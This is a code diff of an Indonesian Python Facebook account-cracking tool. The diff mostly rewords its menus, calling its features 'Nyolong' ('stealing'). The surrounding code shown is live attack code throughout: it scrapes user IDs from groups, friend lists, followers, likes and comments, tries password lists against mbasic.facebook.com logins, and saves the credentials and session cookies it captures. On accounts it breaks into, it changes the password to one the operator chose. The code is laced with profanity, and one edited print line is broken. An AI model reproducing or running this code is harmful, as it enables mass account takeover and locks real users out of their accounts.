@@ -72,16 +72,16 @@ def hasil(ok,cp):
         print('\n\n %s[%s✓%s] crack selesai sayang...'%(N,K,N))
         print(' [%s•%s] akun \033[0;92mOK \033[0;97m: %s%s%s'%(O,N,H,str(len(ok)),N))
         print(' [%s•%s] akun \033[0;93mCP \033[0;97m: %s%s%s'%(O,N,K,str(len(cp)),N))
-        cek_cp = input(f"\n [{O}?{N}] munculkan opsi checkpoint detedtor? [y/t]: ")
+        cek_cp = input(f"\n [{O}?{N}] Ingin Mendeteksi Akun Checkpoin? [y/t]: ")
         if cek_cp =="":
             print(f"\n [{M}!{N}] jangan kosong");hasil(ok,cp)
         elif cek_cp in["Y","y"]:
-            jalan(f" [{M}!{N}] hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
-            ww=input(f"\n [{O}?{N}] ubah password akun one tap? [y/t]: ")
+            jalan(f" [{M}!{N}] Hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(2)
+            ww=input(f"\n [{O}?{N}] Ubah password akun one tap? [y/t]: ")
             if ww in ("Y","y","ya"):
                 ubahP.append("y")
-                print(f" [{H}•{N}] contoh password : {H}Aangxd{N}")
-                pwBar=input(f" [{H}?{N}] masukan password baru : ")
+                print(f" [{H}•{N}] Contoh password : {H}Aangxd{N}")
+                pwBar=input(f" [{H}?{N}] Masukan password baru : ")
                 print("\n")
                 if len(pwBar) <= 5:
                     print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
@@ -90,25 +90,25 @@ def hasil(ok,cp):
             for memek in cp:
                 kontol = memek.replace('\n', '')
                 titid  = kontol.split('|')
-                jalan(f' {N}>{M}>{N}> cek login : {K}{kontol.replace(" [×] ", "")}{N}')
+                jalan(f' {N}>{M}>{N}> Cek Login : {K}{kontol.replace(" [×] ", "")}{N}')
                 try:
                     log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                 except requests.exceptions.ConnectionError:
                     continue
                 print("")
             print("")
-            print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
-            input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            print(' [ %sProses Pengecekan Selesai %s]\n'%(H,N))
+            input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
         elif cek_cp in["T","t"]:
             exit(f"\n  {O}*{N} Selamat tinggal:)")
         else:
-            print(f"\n [{M}!{N}] Y/t goblok");hasil(ok,cp)
+            print(f"\n [{M}!{N}] y/t Goblok");hasil(ok,cp)
     else:
         print('\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N));exit()
 def yayanxd():
     os.system('clear')
     print (' %s[•]%s tools ini menggunakan login cookies facebook.\n %s[•]%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s[•]%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
-    cookie = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
+    cookie = input("\n %s[%s?%s] Cookies Lu Mana : %s"% (N,K,N,O))
     if cookie in['OPEN','Open','open']:
       jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,H));time.sleep(3);os.system('xdg-open https://youtu.be/iDVCcnLcTnE');yayanxd()
     try:
@@ -148,24 +148,24 @@ def moch_yayan():
     IP = requests.get('https://yayanxd.my.id/server/ip').text
     _mmk_ = open('.cokie.txt').read()
     kueh  = {"cookie":_mmk_}
-    print("\n [•] Your IP   : %s"%(IP));time.sleep(0.04)
-    print(" [•] Your Name : %s%s%s\n"%(K,nama,N));time.sleep(0.04)
-    print(' [%s01%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mAnggota grup'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s02%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mTeman publik'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s03%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mTotal Followers'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s04%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mLike Postingan'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s05%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mRandom ID Massal'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s06%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mKomentar Postingan'%(H,N));time.sleep(0.04)
-    print(' \033[0;97m[%s07%s] \033[0;96mCrack \033[0;93mAkun \033[0;97mInstagram [%sNEW%s]'%(H,N,H,N));time.sleep(0.04)
-    print(' [%s08%s] \033[0;96mCheckpoint \033[0;97mDetector'%(H,N));time.sleep(0.04)
-    print(' [%s09%s] \033[0;96mSetting \033[0;97mUser Agent'%(H,N));time.sleep(0.04)
-    print(' [%s10%s] \033[0;96mLihat \033[0;97mHasil \033[0;96mCrack \033[0;97mSaya'%(H,N));time.sleep(0.04)
-    print(' [%s00%s] Keluar [%sAh Ngecrot%s]'%(K,N,K,N));time.sleep(0.04)
+    print("\n [•] Your IP   : %s"%(IP));time.sleep(0.03)
+    print(" [•] Your Name : %s%s%s\n"%(K,nama,N));time.sleep(0.03)
+    print(' [%s01%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mAnggota grup'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s02%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mTeman publik'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s03%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mTotal Followers'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s04%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mLike Postingan'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s05%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mRandom ID Massal'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s06%s] \033[0;96mNyolong \033[0;97mID Dari \033[0;93mKomentar Postingan'%(H,N));time.sleep(0.03)
+    print(' \033[0;97m[%s07%s] \033[0;96mNyolong \033[0;93mAkun \033[0;97mInstagram [%sNEW%s]'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s08%s] \033[0;96mCek \033[0;97mOpsi Checkpoin%(H,N));time.sleep(0.03)
+    print(' [%s09%s] \033[0;96mSetting \033[0;97mUser Agent'%(H,N));time.sleep(0.03)
+    print(' [%s10%s] \033[0;96mLihat \033[0;97mHasil \033[0;96mCrack \033[0;97mSaya'%(H,N));time.sleep(0.03)
+    print(' [%s00%s] Keluar [%sAh Ngecrot%s]'%(K,N,K,N));time.sleep(0.03)
     pepek = input('\n [%s•%s] Menu : '%(H,N))
     if pepek == '':
         print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
     elif pepek in['1','01']:
-        kontol = input(f"{N} [?] masukkan id grup : ")
+        kontol = input(f"{N} [?] Masukkan id grup : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
         else:
@@ -186,14 +186,14 @@ def moch_yayan():
     elif pepek in['2','02']:
         try:
             print("\n [*] Ketik 'me' jika ingin crack dari daftar teman")
-            user = input(' [*] masukan id atau username : ')
+            user = input(' [?] Masukan id atau username : ')
             _memek_ = __convert__(user)
             for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
                 id.append(a['id'] + '<=>' + a['name'])
         except KeyError:
             print('\n %s[%s×%s] gagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
     elif pepek in['3','03']:
-        kontol = input(f"{N} [?] masukan id atau username followers : ")
+        kontol = input(f"{N} [?] Masukan id atau username followers : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
         try:
@@ -202,7 +202,7 @@ def moch_yayan():
         except KeyError:
             print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
     elif pepek in['4','04']:
-        kontol = input(f"{N} [?] masukan id postingan : ")
+        kontol = input(f"{N} [?] Masukan id postingan : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
         try:
@@ -213,7 +213,7 @@ def moch_yayan():
     elif pepek in['5','05']:
         _ngocok_(kontol)
     elif pepek in['6','06']:
-        kontol = input(f"{N} [?] masukan id postingan : ")
+        kontol = input(f"{N} [?] Masukan id postingan : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
         try:
@@ -233,9 +233,9 @@ def moch_yayan():
         print('\n [ hasil crack yang tersimpan di file anda ]\n')
         for file in dirs:
             print(" [%s+%s] %s"%(O,N,file))
-        file = input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
+        file = input("\n [%s?%s] Masukan nama file :%s "%(M,N,H))
         if file == "":
-            file = input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
+            file = input("\n %s[%s?%s] Masukan nama file :%s %s"%(N,M,N,H,N))
         total = open("results/%s"%(file)).read().splitlines()
         print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
         nm_file = ("%s"%(file)).replace("-", " ")
@@ -247,15 +247,15 @@ def moch_yayan():
             titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
             print("%s%s"%(titid,N));time.sleep(0.03)
         print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
-        input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        input('\n [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['0','00']:
         print("")
         titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
         for x in titik:
-            sys.stdout.write('\r %s[%s+%s] menghapus cookie %s'%(N,M,N,x)); sys.stdout.flush()
+            sys.stdout.write('\r %s[%s•%s] Menghapus cookies %s'%(N,M,N,x)); sys.stdout.flush()
             time.sleep(1)
         os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
-        exit('\n %s[%s✓%s]%s berhasil menghapus cookie'%(N,M,N,H))
+        exit('\n %s[%s✓%s]%s Berhasil menghapus cookie'%(N,H,N,H))
     else:
         print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
     if len(id)!=0:
@@ -276,13 +276,13 @@ def seting_yntkts():
             user_agent = open('YNTKTS.txt', 'r').read()
         except IOError:
             user_agent = '%s-'%(M)
-        print('\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent))
+        print('\n %s[%s•%s] User Agent anda : %s%s'%(N,O,N,H,user_agent))
         input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     else:
         print('\n %s[%s×%s] input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()
 def yo_ndak_tau_ko_tanya_saia():
     os.system('rm -rf YNTKTS.txt')
-    _asu_ = input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
+    _asu_ = input('\n [%s?%s] Ingin menggunakan user agent hp anda [y/t]: '%(O,N))
     if _asu_ == '':
         print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
     elif _asu_ in['Y','y']:
@@ -292,9 +292,9 @@ def yo_ndak_tau_ko_tanya_saia():
         jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
         input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     elif _asu_ in['T','t']:
-        _agen_ = input(' [%s?%s] masukan user agent :%s '%(O,N,H))
+        _agen_ = input(' [%s?%s] Masukan user agent :%s '%(H,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
-        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+        jalan('\n %s[%s✓%s] Berhasil mengganti user agent...'%(N,H,N))
         input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     else:
         print('\n %s[%s!%s] Y/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
@@ -309,7 +309,7 @@ def crack_grup(hencet):
                 id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
             else:
                 id.append(softek[0]+"<=>"+softek[1])
-            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
+            sys.stdout.write('\r [•] Lagi Nyolong %s id... '%(len(id))); sys.stdout.flush()
         if "Lihat Selengkapnya" in kontol:
             crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
         else:
@@ -330,7 +330,7 @@ def crack_grup(hencet):
                                 continue
                             else:
                                 id.append(d+"<=>"+c[1])
-                        sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
+                        sys.stdout.write('\r [•] Lagi Nyolong %s id... '%(len(id))); sys.stdout.flush()
                 if "Lihat Postingan Lainnya" in a:
                     geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
             geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
@@ -349,7 +349,7 @@ def like_post(hencet):
                     id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                 else:
                     id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
-                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
+                sys.stdout.write('\r [•] Lagi Nyolong %s id... '%(len(id))); sys.stdout.flush()
             if "Lihat Selengkapnya" in kontol:
                 like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
     except:pass
@@ -364,7 +364,7 @@ def followers(hencet):
                 bb = mmk.text
                 xd = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",mmk.get("href")))
                 id.append(bb+'<=>'+xd+'\n')
-            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
+            sys.stdout.write('\r [•] Lagi Nyolong %s id... '%(len(id))); sys.stdout.flush()
         for asu in memek.find_all('a',href=True):
             if 'Lihat Selengkapnya' in asu.text:
                 followers("https://mbasic.facebook.com/subscribe/lists/?id="+asu.get("href"))
@@ -387,19 +387,19 @@ def ngomen_post(hencet):
                     bb = xz.split('/')[1]
                     xd = _id_.text
                     id.append(bb+'<=>'+xd+'\n')
-                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
+                sys.stdout.write('\r [•] Lagi Nyolong %s id... '%(len(id))); sys.stdout.flush()
         for asu in memek.find_all("a",href=True):
             if "Lihat komentar lainnya…" in asu.text:
                 ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
     except:pass
 def _ngocok_(__ppk__):
     try:
-        nanya_keun = int(input('\n [%s?%s] masukan jumblah target : '%(M,N)))
+        nanya_keun = int(input('\n [%s?%s] Masukan jumblah target : '%(M,N)))
     except:nanya_keun=1
     print(" [%s*%s] Ketik 'me' jika ingin crack dari daftar teman\n"%(O,N))
     for mnh in range(nanya_keun):
         mnh +=1
-        user = input(' [%s*%s] masukan id atau username %s%s%s : '%(O,N,H,mnh,N))
+        user = input(' [%s?%s] Masukan id atau username %s%s%s : '%(O,N,H,mnh,N))
         _memek_ = __convert__(user)
         try:
             for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),__ppk__)).json()["data"]:
@@ -407,7 +407,7 @@ def _ngocok_(__ppk__):
                 nama = a["name"]
                 id.append(uid+"<=>"+nama)
         except (KeyError,IOError):
-            print('\n [×] gagal mengambil id, kemungkinan id tidaklah publik');time.sleep(3);moch_yayan()
+            print('\n [×] gagal nyolong id, kemungkinan id tidaklah publik');time.sleep(3);moch_yayan()
 def __convert__(user):
     if user == "me":
         return {"_kontol_":user}
@@ -434,8 +434,8 @@ def gabut():
     ww=input(f"\n {N}[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
     if ww in ("Y","y","ya"):
         ubahP.append("y")
-        print(f" [{H}•{N}] contoh password : {H}Aangxd{N}")
-        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
+        print(f" [{H}•{N}] Contoh password : {H}Aangxd{N}")
+        pwBar=input(f"\n [{H}?{N}] Masukan password baru : ")
         if len(pwBar) <= 5:
              print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
         else:
@@ -445,14 +445,14 @@ def gabut():
     for memek in buka_baju:
         kontol = memek.replace('\n', '')
         titid  = kontol.split('|')
-        jalan(f' {N}>{M}>{N}> cek login: {K}{kontol.replace(" [×] ", "")}{N}')
+        jalan(f' {N}>{M}>{N}> Cek Login: {K}{kontol.replace(" [×] ", "")}{N}')
         try:
             log_hasil(titid[0].replace(" [×] ", ""), titid[1])
         except requests.exceptions.ConnectionError:
             continue
         print("")
     print("")
-    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
+    print('  [ %sProses Pengecekan Selesai %s]\n'%(H,N))
     input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()
 def log_hasil(user, pasw):
     global aman,cp,salah
@@ -463,7 +463,7 @@ def log_hasil(user, pasw):
         "accept-encoding":"gzip, deflate",
         "accept-language":"id-ID,id;q=0.9",
         "referer":"https://mbasic.facebook.com/",
-        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+        "user-agent":"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]"
     })
     soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
     link=soup.find("form",{"method":"post"})
@@ -480,7 +480,7 @@ def log_hasil(user, pasw):
         else:
             coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
             open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
-            print(f"\r  •{H} akun one tap nih ngab !!{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah sandi dan cek aplikasi...{N}");time.sleep(0.03)
+            print(f"\r  •{H} Akun one tap nih ngab !!{N}");jalan(f"\r  {O}*{H}  Tunggu sebentar sedang mengubah sandi dan cek aplikasi...{N}");time.sleep(0.03)
             cek_apk(session,coki)
     elif "checkpoint" in session.cookies.get_dict():
         title=re.findall("\<title>(.*?)<\/title>",str(response))
@@ -497,11 +497,11 @@ def log_hasil(user, pasw):
             if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                 if "y" in ubahP:
                     mmk = pwBaru
-                    print(f"\r  •{H} akun one tap nih ngab !!{N}");jalan(f"\r  {O}•{H} tunggu sebentar sedang mengubah sandi dan cek aplikasi{N}");time.sleep(0.03)
+                    print(f"\r  •{H} Akun one tap nih ngab !!{N}");jalan(f"\r  {O}•{H} Tunggu sebentar sedang mengubah sandi dan cek aplikasi{N}");time.sleep(0.03)
                     ubah_pw(session,response,link2,user, mmk)
                 else:
                     mmk = "YayanGanteng:v"
-                    print(f"\r  •{H} akun one tap nih ngab !!{N}");jalan(f"\r  {O}•{H} tunggu sebentar sedang mengubah sandi dan ecek aplikasi{N}");time.sleep(0.03)
+                    print(f"\r  •{H} Akun one tap nih ngab !!{N}");jalan(f"\r  {O}•{H} tunggu sebentar sedang mengubah sandi dan ecek aplikasi{N}");time.sleep(0.03)
                     ubah_pw(session,response,link2,user, mmk)
             elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                 print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
@@ -512,9 +512,9 @@ def log_hasil(user, pasw):
             open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
             print(" %s>%s>%s> Ditemukan %s Opsi "%(N,O,N,len(cek)))
         for opt in range(len(cek)):
-            print(f"   [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
+            print(f"    >\x1b[1;92m{str(opt+1)}\x1b[0m> "+cek[opt])
     else:
-        print(f"\r   {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
+        print(f"\r   {N}[{M}!{N}] Waduh kata sandi salah ngab !!")
         open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")
 def ubah_pw(session,response,link2,user,mmk):
     dat,dat2={},{}
@@ -561,7 +561,7 @@ class __crack__:
     def plerr(self,id):
         self.id = id
         print(' [%s•%s] total id -> [%s%s%s]' %(O,N,M,len(self.id),N))
-        ___yayanganteng___ = input(' [%s?%s] ingin menggunakan kata sandi manual? [y/t]: '%(O,N))
+        ___yayanganteng___ = input(' [%s?%s] Ingin menggunakan kata sandi manual? [y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print('\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
             while True:
